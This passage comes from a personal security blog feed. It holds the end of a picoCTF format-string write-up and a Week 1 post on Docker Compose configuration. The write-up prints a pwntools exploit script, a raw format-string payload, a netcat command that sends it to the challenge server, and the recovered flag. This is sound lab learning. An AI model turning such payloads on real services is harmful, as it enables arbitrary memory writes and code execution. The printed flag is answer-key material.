+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Read in the flag&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;FILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;flag.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;r&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fgets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fflush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;sus = 0x%x&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;You can do better!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fflush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Surprisingly enough, if you have control over the format string, you have arbitrary write access to the entire stack, effectively allowing for remote code execution. I spent a good while trying to use the input string &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\x60\x40\x40\x00\x00\x00\x00\x00%14$n&lt;/code&gt; to set the value of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sus&lt;/code&gt; to 4 to progress the development of the exploit. Doing some more digging, however, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pwntools&lt;/code&gt; is actually smart enough to do automatic exploitation! Using the sample code from the official documentation from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pwntools&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fmtstr&lt;/code&gt; &lt;a href=&quot;https://docs.pwntools.com/en/stable/fmtstr.html&quot;&gt;library&lt;/a&gt;, I can create a simple python script that automates the exploitation development process:&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;./vuln&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;rhea.picoctf.net&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;53865&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Function to send payload to target
+&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;exec_fmt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt; 
+	&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;rhea.picoctf.net&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;53865&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payoad&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;autofmt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FmtStr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exec_fmt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# Create exploit automater
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;autofmt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Key-value pairs for addresses and their final value after exploit
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;writes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+	&lt;span class=&quot;mh&quot;&gt;0x404060&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x67616c66&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fmtstr_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;writes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;With the output being:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;jakemull㉿leman-russ&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/ctf/pico/format-string-2]
+└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 pwn.py
+b&lt;span class=&quot;s2&quot;&gt;&quot;You don&apos;t have what it takes. Only a true wizard could change my suspicions. What do you have to say?&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Here&apos;s your input:                                                                                                      uc    &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00                                                                                                                                                                                                                                                    &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00aaaaba&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;@@&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;I have NO clue how you did that, you must be a wizard. Here you go...&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;picoCTF&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;f0rm47_57r?_f0rm47_m3m_ccb55fce&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;
+b&apos;%102c%20&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$llnc&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;%21&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$hhn&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;%5c%22&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$hhn&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;%245c%23&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$hhnaaaaba&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;@@&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00c@@&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00a@@&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00b@@&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00&lt;span class=&quot;s1&quot;&gt;&apos;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This garbled mess contains the flag: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;picoCTF{f0rm47_57r?_f0rm47_m3m_ccb55fce}&lt;/code&gt;, and the final payload is:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;%102c%20$llnc%21$hhn%5c%22$hhn%245c%23$hhnaaaaba`@@\x00\x00\x00\x00\x00c@@\x00\x00\x00\x00\x00a@@\x00\x00\x00\x00\x00b@@\x00\x00\x00\x00\x00
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;We can test this using the commands:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; python3 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;print(&quot;%102c%20$llnc%21$hhn%5c%22$hhn%245c%23$hhnaaaaba`@@\x00\x00\x00\x00\x00c@@\x00\x00\x00\x00\x00a@@\x00\x00\x00\x00\x00b@@\x00\x00\x00\x00\x00&quot;)&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; payload.txt
+&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;payload.txt | nc rhea.picoctf.net 58955
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Knowing the shape of the final payload, I’m glad that someone figured all this out before me, though I would like to be able to do it by hand eventually. I’m frequently impressed with how clever pwntools can be. We ought to watch out so it doesn’t become sentient.&lt;/p&gt;</content><author><name>Jake Mullins</name></author><category term="year-of-hacking" /><category term="pwn" /><summary type="html">This week I took a look at 3 format string challenges in PicoCTF. Format string attack introduction In every computer science student’s first introduction to low-level programming in C, they are instructed to use printf to display output to the terminal, or fprintf/dprintf to write to a file or file descriptor. printf is a high-level function that is defined in the libc C API standard, and its most common implementation is in GNU’s glibc library, though others exist. The function definition is: int printf(const char *restrict format, ...); The format argument is a string that can be used define the final format of the data being written, and is frequently used as a teaching tool for demonstrating how different representations of data can mean the same thing. The ... argument is an arbitrary-length list of arguments to be passed to the format string as inputs.</summary></entry><entry><title type="html">Week 1 - Intro &amp;amp; Simple Docker Orchestration</title><link href="http://localhost:4000/year-of-hacking-0x1" rel="alternate" type="text/html" title="Week 1 - Intro &amp;amp; Simple Docker Orchestration" /><published>2024-04-04T00:00:00-06:00</published><updated>2024-04-04T00:00:00-06:00</updated><id>http://localhost:4000/Year-of-Hacking-0x1</id><content type="html" xml:base="http://localhost:4000/year-of-hacking-0x1">&lt;p&gt;I’m setting out to write a short blog post every week about whatever Cybersecurity or information security related topic I’m working on. There will likely be repeats, and cop-outs where I can’t post source code because it’s linked to a school assignment, and more than a few weeks that aren’t related to security. Hopefully they will be published each Monday for the next year.&lt;/p&gt;
+
+&lt;p&gt;I’m hoping by the end of this project, I will have increased my technical expertise in a variety of different fields, and get a decently broad survey of the cybersecurity landscape, as well as better my writing skills and keep a public record of some of the technical feats I’ve accomplished.&lt;/p&gt;
+&lt;h1 id=&quot;docker&quot;&gt;Docker&lt;/h1&gt;
+&lt;p&gt;Docker is an incredibly widespread and useful technology, packaged with half a dozen enterprise software platforms. It is old, so to my understanding it’s being phased out in favor of newer solutions like Podman which don’t require root privileges out of the box. Regardless, it still is an immensely useful tool for people working in information security as it allows professionals to work with complicated software setups that don’t necessitate a full VM, but could benefit from a custom environment. I’ve dabbled in docker before for school assignments, using the Kali Linux image before I set up the Kali Linux WSL instance, and using the afl-fuzz image during previous experiments with fuzzing.&lt;/p&gt;
+
+&lt;p&gt;In order to solidify the concept of docker images and container orchestration, I designed a simple project that could benefit from having multiple docker containers. I think it would be interesting to see what gifs people choose to correlate with certain songs. For example the Polish song &lt;a href=&quot;https://open.spotify.com/track/40rPqOehcndc4xODWUCfYo?si=efabf09152f9462a&quot;&gt;Gdzie Jest Bialy Wegorz&lt;/a&gt; by Cypis has been associated with this gif of a dancing Holstein cow like &lt;a href=&quot;https://www.youtube.com/watch?v=Vy8moBcKVIM&amp;amp;ab_channel=skeet&quot;&gt;this video with 1.5 Million views&lt;/a&gt;, which is peculiar given the vulgar lyrics about drug addiction and withdrawal.
+&lt;img src=&quot;https://imgs.search.brave.com/vyhNnOzvLjBSo2fhUGwEU5QacyS_v0cyAWQXgwH9k5g/rs:fit:860:0:0/g:ce/aHR0cHM6Ly9tZWRp/YTEudGVub3IuY29t/L20vX2dmcWZYQVAw/OElBQUFBQy9wb2xp/c2gtY293LWNvdy5n/aWY.gif&quot; alt=&quot;Polish Cow Meme&quot; /&gt;
+I’m creating a simple website that accesses a user’s Spotify account and asks them to submit a tenor link. The idea is to have a sizeable user-generated database of what gifs people most associate with a particular song for use by later projects. This is ultimately pretty attainable, and could serve as a teaching tool for my day job as a web security teacher.&lt;/p&gt;
+&lt;h2 id=&quot;docker-compose-file&quot;&gt;Docker compose file&lt;/h2&gt;
+&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;3.9&apos;&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;services&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;  db&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;    image&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;postgres:16&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;    environment&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;      POSTGRES_ROOT_PASSWORD&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;${POSTGRES_ROOT_PASSWORD}&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;      POSTGRES_DB&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;${POSTGRES_DB}&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;      POSTGRES_USER&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;${POSTGRES_USER}&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;      POSTGRES_PASSWORD&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;${POSTGRES_PASSWORD}&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;    ports&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;      - &quot;5432:5432&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;    volumes&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;      - db_data:/var/lib/mysql&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;      - ./queries/init/init.sql:/docker-entrypoint-initdb.d/init.sql&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;  backend&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;    image&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;node:20&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;    user&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;node&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;    working_dir&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/app&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;    depends_on&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;      - db&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;    environment&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;      NODE_ENV&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;dev&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;      POSTGRES_ROOT_PASSWORD&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;${POSTGRES_ROOT_PASSWORD}&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;      POSTGRES_DB&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;${POSTGRES_DB}&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;      POSTGRES_USER&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;${POSTGRES_USER}&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;      POSTGRES_PORT&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;${POSTGRES_PORT}&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;      POSTGRES_PASSWORD&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;${POSTGRES_PASSWORD}&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;      POSTGRES_ALIAS&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;${POSTGRES_ALIAS}&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;    volumes&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;      - ./src/:/app/&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;    ports&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;      - &quot;3000:3000&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;    links&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;      - &quot;db:database&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;    command&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;npm&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;start&quot;&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;volumes&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;  db_data&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h3 id=&quot;interesting-features-with-security-implications&quot;&gt;Interesting features with security implications&lt;/h3&gt;
+&lt;p&gt;It is possible to pass environment variables to docker images using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;environment&lt;/code&gt; tag in a docker compose file. It would be pretty easy for a lazy developer to hardcode in sensitive information into these values, exposing credentials should source code for a deployment be leaked. The more secure and easier to manage method is to create a separate &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.env&lt;/code&gt; file defining all the environment variables with the sensitive data. Luckily, the developers of docker recognize this as the best practice, so &lt;a href=&quot;https://docs.docker.com/compose/environment-variables/set-environment-variables/&quot;&gt;official documentation&lt;/a&gt; list this as the primary method. This is what my &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.env&lt;/code&gt; file looks like:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;POSTGRES_ROOT_PASSWORD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;xxxxx
+&lt;span class=&quot;nv&quot;&gt;POSTGRES_DB&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;spotify_gif
+&lt;span class=&quot;nv&quot;&gt;POSTGRES_USER&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;spotifygifuser
+&lt;span class=&quot;nv&quot;&gt;POSTGRES_PASSWORD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;xxxxx
+
+&lt;span class=&quot;nv&quot;&gt;POSTGRES_PORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;5432
+&lt;span class=&quot;nv&quot;&gt;POSTGRES_ALIAS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;database
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
